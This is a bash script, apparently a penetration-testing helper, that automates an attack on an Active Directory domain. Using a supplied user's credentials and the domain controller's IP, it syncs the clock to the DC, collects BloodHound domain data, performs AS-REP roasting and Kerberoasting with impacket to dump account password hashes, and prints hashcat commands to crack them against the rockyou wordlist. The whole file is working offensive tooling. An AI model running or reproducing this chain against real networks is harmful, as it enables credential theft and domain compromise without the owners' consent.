#!/bin/bash

quitflag=0
cmdflag=0

help (){
   echo -e "First Bl00d - a gerbil Production.\nAuthor: gerbil\nv1.2 - 20260929\nSimply rolls bloodhound-ce-python, impacket-GetNPUsers and impacket-GetUserSPNs into a single command.\nAlso eliminates clock skews by basing time on that of the DC."
   echo -e "\nParameters:\n\t-u|--user <username>\t:\tUsername to use for login\n\t-p|--pass <password>\t:\tThe password to use\n\t-d|--dom <domain>\t:\tThe domain to use\n\t--dc-ip <DC IP>  \t:\tThe IP address of the DC\n\t-h|--help\t\t:\tThis screen. Congrats on finding it! :O)"
   echo -e "\nUsage:\n$0 -u|--user <username> -p|--pass <password> -d|--dom <domain> --dc-ip <dc-ip>\n"
      
}

#Check for tools installations
for i in faketime bloodhound-ce-python impacket-GetNPUsers impacket-GetUserSPNs; do
   [[ $( expr length "$(which ${i})" ) -eq 0 ]] && echo "Cannot find ${i}." && cmdflag=1
done

[[ ${cmdflag} -eq 1 ]] && echo -e "\nPackages above need to be installed. See requirements section of https://github.com/gerbilbyte/firstbl00d\nExiting.\n" && exit 1

#Show helpscreen if no parameters have been given
[[ $# -eq 0 ]] && help && exit 1

#Parse script parameters
while [ $# -gt 0 ]; do
    case "$1" in
        --user|-u) user=$2 ; shift;;
        --pass|-p) pass=$2 ; shift;;
        --domain|-d) dom=$2 ; shift;;
        --dc-ip) dcip=$2 ; shift;;
        --help|-h) help && exit 0 ; shift;;
        *) echo "Unknown command: $1 $2" && exit 1
    esac
shift
done

#Check for missing parameters
[[ "${user}X" == "X" ]] && echo "ERROR: Missing -u|--user and/or user value" && quitflag=1
[[ "${pass}X" == "X" ]] && echo "ERROR: Missing -p|--pass and/or password value" && quitflag=1
[[ "${dom}X" == "X" ]] && echo "ERROR: Missing -d|--dom and/or dom value" && quitflag=1
[[ "${dcip}X" == "X" ]] && echo "ERROR: Missing --dc-ip and/or dc-ip value" && quitflag=1

[[ ${quitflag} -eq 1 ]] && echo -e "\nUsage: $0 -u|--user <username> -p|--pass <password> -d|--dom <domain> --dc-ip <dc-ip>" && exit 1 

#The magic begins
echo -e "\nUser:${user}  Password:${pass}  Domain:${dom}  DC-IP:${dcip}"

#Get DC time
dc_timestamp="$( date -d "$( net time -S ${dcip} )" +"%Y-%m-%d %H:%M:%S" )"

echo -en "\nTime of DC: "
faketime "${dc_timestamp}" date

#Get Bloodhound data
echo -e "\nBLOODHOUND DATA: Running bloodhound-ce-python -ns ${dcip} -d '${dom}' -u '${user}' -p '${pass}' -c all -op ${dom}_bh\n"
faketime "${dc_timestamp}" bloodhound-ce-python  -ns ${dcip} -d ${dom} -u ${user} -p ${pass} -c all -op ${dom}_bh
echo "  ...zipping up the data as ${dom}_AD.zip"
zip ${dom}_AD.zip ${dom}_bh*.json

#Get AS-REP roasting data
echo -e "\nAS-REP ROASTING: Running impacket-GetNPUsers -dc-ip ${dcip} -request -outputfile hashes.asreproast ${dom}/${user}:${pass}"
faketime "${dc_timestamp}" impacket-GetNPUsers -dc-ip ${dcip} -request -outputfile ${dom}_hashes.asreproast ${dom}/${user}:${pass}

#Get Kerberoasting data
echo -e "\nKERBEROASTING: Running impacket-GetUserSPNs -dc-ip ${dcip} -request -outputfile hashes.kerberoast ${dom}/${user}:${pass}"
faketime "${dc_timestamp}" impacket-GetUserSPNs -dc-ip ${dcip} -request -outputfile ${dom}_hashes.kerberoast ${dom}/${user}:${pass}

#Printing awesome text to make the next steps even easier
echo -e "\n--=CRACK HASHES=--\n\nAS-REP ROASTING:\nhashcat -m 18200 ${dom}_hashes.asreproast /usr/share/wordlists/rockyou.txt -r best64g.rule"
echo -e "\nKERBEROASTING:\nhashcat -m 13100 ${dom}_hashes.kerberoast /usr/share/wordlists/rockyou.txt -r best64g.rule\n"

